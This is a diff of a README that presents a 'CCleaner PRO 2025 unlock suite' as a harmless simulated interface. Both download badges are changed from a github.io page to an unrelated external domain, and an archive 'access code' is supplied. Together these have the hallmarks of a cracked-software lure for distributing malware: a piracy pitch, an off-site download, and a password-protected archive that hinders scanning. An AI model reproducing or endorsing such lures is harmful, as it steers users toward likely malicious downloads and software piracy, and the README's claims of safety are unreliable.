@@ -3,7 +3,7 @@
 Explore the features of CCleaner PRO 2025 in a safe, simulated environment.  
 This offline UI utility provides a visual experience of optimization modules, license states, and configuration flows — **without modifying your system**.
 
-[![Download Unlock Tool](https://img.shields.io/badge/Download-CCleaner--Unlock--Suite-blueviolet?style=for-the-badge&logo=windows)](https://ccleaner-unlock-suite.github.io)
+[![Download Unlock Tool](https://img.shields.io/badge/Download-CCleaner--Unlock--Suite-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
 
 ---
 
@@ -51,7 +51,7 @@ ccleaner module viewer, ccleaner config tool, registry cleanup panel, system hea
 
 ### 📥 Download
 
-[![Download Unlock Tool](https://img.shields.io/badge/Download-CCleaner--Unlock--Suite-blueviolet?style=for-the-badge&logo=windows)](https://ccleaner-unlock-suite.github.io)
+[![Download Unlock Tool](https://img.shields.io/badge/Download-CCleaner--Unlock--Suite-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
 
 🗝 Access code: `cleaner2025_gui`  
 📦 Contents: UI shell, simulated logs, instructions, screenshots  
